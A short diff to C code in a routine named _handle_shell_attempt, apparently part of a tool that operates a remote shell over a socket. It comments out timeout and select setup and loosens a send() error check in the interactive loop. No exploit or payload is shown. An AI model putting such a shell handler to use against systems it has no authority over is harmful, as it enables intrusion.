@@ -160,7 +160,6 @@ _handle_shell_attempt:
         return -1;
     }
     pthread_join(tid, NULL);
-    ///////////////
     if (setsockopt(client_fd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout)) == -1) {
         perror("setsockopt");
         DBGLG("Could not set appropriate timeout\n");
@@ -174,16 +173,16 @@ _handle_shell_attempt:
     sleep(1);
     DBGLG("Waiting for the responce\n");
     while ((response = recv(client_fd, buf, sizeof(buf), 0)) > 0) {
-        fd_set read_fds;
-        FD_ZERO(&read_fds);
-        FD_SET(client_fd, &read_fds);
-        struct timeval timeout1;
-        timeout.tv_sec = 0; // Timeout in seconds
-        timeout.tv_usec = 1000;
+        // fd_set read_fds;
+        // FD_ZERO(&read_fds);
+        // FD_SET(client_fd, &read_fds);
+        // struct timeval timeout1;
+        // timeout.tv_sec = 1; // Timeout in seconds
+        // timeout.tv_usec = 0;
         buf[response] = '\0';
         printf("%s", buf);
         fgets(buf, sizeof(buf), stdin);
-        if (send(client_fd, buf, strlen(buf), 0) <= 0){
+        if (send(client_fd, buf, strlen(buf), 0) < 0){
             break;
         }
     }
